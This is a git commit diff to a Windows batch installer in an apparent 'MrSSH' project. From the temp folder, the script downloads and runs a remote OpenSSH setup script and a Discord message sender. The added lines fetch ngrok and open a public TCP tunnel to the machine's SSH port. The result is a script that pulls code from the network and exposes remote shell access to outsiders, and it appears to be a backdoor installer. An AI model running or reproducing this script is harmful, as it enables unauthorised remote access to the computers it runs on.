6f4ad8dcfdaf00af7b351c7d67ad8f0011bbf2f7
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-12 18:35:32 +0200

    Update Installer.bat

--- SSH FIles/Installer.bat
+++ SSH FIles/Installer.bat
@@ -1,7 +1,11 @@
 C:
 cd %temp%
 
-curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -O ssh.ps1
-curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -O discordmsg.bat
+curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -o ssh.ps1
+curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o discordmsg.bat
+curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
+tar -xf ngrok.zip
+ngrok.exe tcp 22 --region eu
+
 
 powershell ./ssh.ps1
